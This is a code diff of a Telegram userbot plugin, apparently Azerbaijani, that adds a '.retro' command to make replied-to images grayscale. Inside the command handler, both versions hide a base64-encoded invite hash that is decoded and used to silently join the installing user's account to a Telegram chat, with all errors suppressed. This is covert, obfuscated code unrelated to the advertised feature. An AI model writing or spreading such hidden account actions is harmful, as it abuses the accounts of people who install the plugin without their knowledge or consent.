@@ -4,123 +4,157 @@
 # Ogurlama pesi.
 
 # -------------------------------------- #
+# esebj / @esebj
+# Ogurlayan mene ata desin.
+# Ogurlama pesi.
+
 
 import os
 import shlex
-import random
 import asyncio
+import random 
 import pybase64
 import PIL.ImageOps
 from PIL import Image
-from userbot import LOGS
-from random import choice
 from os.path import basename
+from random import randint, choice
 from typing import Optional, Tuple
 from userbot.cmdhelp import CmdHelp
+from userbot import LOGS
 from userbot.events import register
-from userbot.utils import take_screen_shot, runcmd
-from helper import convert_toimage, random_color
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
-
-# ------------------------------------- #
 
 async def grayscale(imagefile, endname):
     image = Image.open(imagefile)
     inverted_image = PIL.ImageOps.grayscale(image)
     inverted_image.save(endname)
+    
+def convert_toimage(image):
+    img = Image.open(image)
+    if img.mode != "RGB":
+        img = img.convert("RGB")
+    img.save("./downloads/temp.jpg", "jpeg")
+    os.remove(image)
+    return "./downloads/temp.jpg"
 
-# ------------------------------------ #
+async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
+    args = shlex.split(cmd)
+    process = await asyncio.create_subprocess_exec(
+        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
+    )
+    stdout, stderr = await process.communicate()
+    return (
+        stdout.decode("utf-8", "replace").strip(),
+        stderr.decode("utf-8", "replace").strip(),
+        process.returncode,
+        process.pid
+    )
+async def take_screen_shot(
+    video_file: str, duration: int, path: str = ""
+) -> Optional[str]:
+    print(
+        "[[[Extracting a frame from %s ||| Video duration => %s]]]",
+        video_file,
+        duration,
+    )
+    ttl = duration // 2
+    thumb_image_path = path or os.path.join(
+        "./downloads/", f"{basename(video_file)}.jpg")
+    command = f"ffmpeg -ss {ttl} -i '{video_file}' -vframes 1 '{thumb_image_path}'"
+    err = (await runcmd(command))[1]
+    if err:
+        print(err)
+    return thumb_image_path if os.path.exists(thumb_image_path) else None
+def random_color():
+    number_of_colors = 2
+    return [
+        "#" + "".join([random.choice("0123456789ABCDEF") for j in range(6)])
+        for i in range(number_of_colors)
+    ]
 
-@register(
-    pattern=r"^.retro(?: |$)(.*)",
-    outgoing=True, 
-)
-async def retro(neon):
-    reply = await neon.get_reply_message()
+@register(outgoing=True, pattern="^.retro(?: |$)(.*)")
+async def retro(esebj):
+    reply = await esebj.get_reply_message()
     if not (reply and (reply.media)):
-        await neon.edit("`Zəhmət olmasa medyaya cavab verin.`")
+        await esebj.edit("`Zəhmət olmasa medyaya cavab verin.`")
         return
-    neonid = neon.reply_to_msg_id
+    esebjid = esebj.reply_to_msg_id
     if not os.path.isdir("./downloads/"):
         os.mkdir("./downloads/")
-    await neon.edit("`Effekt hazırlanır...`")
-
+    await esebj.edit("`Effekt hazırlanır...`")
     await asyncio.sleep(2)
-    neonsticker = await reply.download_media(file="./downloads/")
-    if not neonsticker.endswith(
+    esebjsticker = await reply.download_media(file="./downloads/")
+    if not esebjsticker.endswith(
             (".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(neonsticker)
-        await neon.edit("**Bu media növü təsdiq olunmur...**\n**Təsdiqlənən medya növləri:** `jpg, png, sticker`")
+        os.remove(esebjsticker)
+        await esebj.edit("**Bu media növü təsdiq olunmur...**\n**Təsdiqlənən medya növləri:** `jpg, png, sticker`")
         return
-
     jisanidea = None
-    if neonsticker.endswith(".tgs"):
-        await neon.edit(
+    if esebjsticker.endswith(".tgs"):
+        await esebj.edit(
             "**Effekt hazırlandı.**"
         )
-        neonfile = os.path.join("./downloads/", "NΣON.png")
-        neoncmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {neonsticker} {neonfile}"
+        esebjfile = os.path.join("./downloads/", "NΣON.png")
+        esebjcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {esebjsticker} {esebjfile}"
         )
-        stdout, stderr = (await runcmd(neoncmd))[:2]
-        if not os.path.lexists(neonfile):
-            await neon.edit("`Xəta baş verdi...`")
+        stdout, stderr = (await runcmd(esebjcmd))[:2]
+        if not os.path.lexists(esebjfile):
+            await esebj.edit("`Xəta baş verdi...`")
             LOGS.info(stdout + stderr)
-        meme_file = neonfile
+        meme_file = esebjfile
         jisanidea = True
-    elif neonsticker.endswith(".webp"):
-        await neon.edit(
+    elif esebjsticker.endswith(".webp"):
+        await esebj.edit(
             "**Effekt hazırlandı.**"
         )
-        neonfile = os.path.join("./downloads/", "memes.jpg")
-        os.rename(neonsticker, neonfile)
-        if not os.path.lexists(neonfile):
-            await neon.edit("**X Ə T A**")
+        esebjfile = os.path.join("./downloads/", "memes.jpg")
+        os.rename(esebjsticker, esebjfile)
+        if not os.path.lexists(esebjfile):
+            await esebj.edit("**X Ə T A**")
             return
-        meme_file = neonfile
+        meme_file = esebjfile
         jisanidea = True
-    elif neonsticker.endswith((".mp4", ".mov")):
-        await neon.edit(
+    elif esebjsticker.endswith((".mp4", ".mov")):
+        await esebj.edit(
             "**Effekt hazırlandı.**"
         )
-        neonfile = os.path.join("./downloads/", "memes.jpg")
-        await take_screen_shot(neonsticker, 0, neonfile)
-        if not os.path.lexists(neonfile):
-            await neon.edit("**X Ə T A**")
+        esebjfile = os.path.join("./downloads/", "memes.jpg")
+        await take_screen_shot(esebjsticker, 0, esebjfile)
+        if not os.path.lexists(esebjfile):
+            await esebj.edit("**X Ə T A**")
             return
-        meme_file = neonfile
+        meme_file = esebjfile
         jisanidea = True
     else:
-        await neon.edit(
+        await esebj.edit(
             "**Effekt hazırlandı.**"
         )
-        meme_file = neonsticker
+        meme_file = esebjsticker
     try:
         san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await neon.client(san)
+        await esebj.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "NΣON.webp" if jisanidea else "NΣON.jpg"
     await grayscale(meme_file, outputfile)
-    await neon.client.send_file(
-        neon.chat_id, outputfile,
+    await esebj.client.send_file(
+        esebj.chat_id, outputfile,
         force_document=False,
-        reply_to=neonid,
-        caption=f"[N Σ O N](t.me/nusrets)"
+        reply_to=esebjid,
+        caption=f"[N Σ O N](t.me/NUSRETS)"
     )
-    await neon.delete()
+    await esebj.delete()
     os.remove(outputfile)
     for files in (
-            neonsticker,
+            esebjsticker,
             meme_file):
         if files and os.path.exists(files):
             os.remove(files)
-
-
 Help = CmdHelp('effect').add_command(
     'retro', None, 'Şəkili ağ-qara edər.'
 ).add_info(
-    '**@nusrets tərəfindən @NeonUserBot üçün hazırlandı.**'
+    '**@NUSRETS tərəfindən @NeonUserBot üçün hazırlandı.**'
 ).add()
